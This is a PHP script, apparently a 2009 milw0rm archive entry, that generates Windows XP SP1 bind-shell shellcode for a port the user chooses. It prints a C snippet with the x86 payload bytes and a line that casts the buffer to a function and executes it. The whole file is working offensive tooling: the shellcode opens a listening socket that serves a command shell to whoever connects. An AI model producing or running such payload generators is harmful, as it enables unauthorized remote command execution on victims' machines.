<?php
/*
Utility	: Generate Payload PortBind Windows XP/SP1
Author	: Jonathan Salwan
Mail	: submit [!] shell-storm.org

	More shellcodes in => http://www.shell-storm.org/shellcode/
*/

function syntax()
	{
	echo "\nSyntax:\nroot@laptop:/# php ./payload.php <port>\n\n";
	}

function win32bind($port)
		{
		if($port > 65535 || $port < 4100){
			echo "Erreur Port\nSelect a port between 4100 and 65535\n";
			return false;
			}

		$inser .= "\nchar shellcode[] = \n";
		$inser .= "			/* BindPort TCP/$port; Os:XP/SP1; Gen:http://www.shell-storm.org */\n";
		$inser .= "\n";

		$inser .= "			\x22\\x83\\xC4\\xEC\\x33\\xC0\\x50\\x50\\x50\\x6A\\x06\\x6A\\x01\\x6A\\x02\\xB8\x22\n";
		$inser .= "			\x22\\x01\\x5A\\xAB\\x71\\xFF\\xD0\\x8B\\xD8\\x33\\xC0\\x89\\x45\\xF4\\xB0\\x02\x22\n";
		$inser .= "			\x22\\x66\\x89\\x45\\xF0\\x66\\xC7\\x45\\xF2";
		$inser .= "\\x";

		$res_port 	= base_convert($port, 10, 16);

		$length 	= strlen($res_port)-1;
		$i 		= 1;

		for($idx = 0; $idx < $length+1; $idx++)
		{
		$i++;
		if($i == 4)
		$inser .= "\\x";

		$inser .= $res_port[$idx];
		}
		$inser .= "\\x6A\\x10\\x8D\\x55\\xF0\x22\n";
		$inser .= "			\x22\\x52\\x53\\xB8\\xCE\\x3E\\xAB\\x71\\xFF\\xD0\\x6A\\x01\\x53\\xB8\\xE2\\x5D\x22\n";
		$inser .= "			\x22\\xAB\\x71\\xFF\\xD0\\x33\\xC0\\x50\\x50\\x53\\xB8\\x8D\\x86\\xAB\\x71\\xFF\x22\n";
		$inser .= "			\x22\\xD0\\x8B\\xD8\\xBA\\x1D\\x20\\xE8\\x77\\x53\\x6A\\xF6\\xFF\\xD2\\x53\\x6A\x22\n";
		$inser .= "			\x22\\xF5\\xFF\\xD2\\x53\\x6A\\xF4\\xFF\\xD2\\xC7\\x45\\xFB\\x41\\x63\\x6D\\x64\x22\n";
		$inser .= "			\x22\\x8D\\x45\\xFC\\x50\\xB8\\x44\\x80\\xC2\\x77\\xFF\\xD0\x22\x3b\n\n";
		$inser .= "	printf(\x22Length: %d\\n\x22,strlen(shellcode));\n";
		$inser .= "	(*(void(*)()) shellcode)();\n\n";

	return $inser;
}

if($argc < 2){
	syntax();
	return false;
	}
		$port = $argv[1];
		echo win32bind($port);

?>

# milw0rm.com [2009-06-09]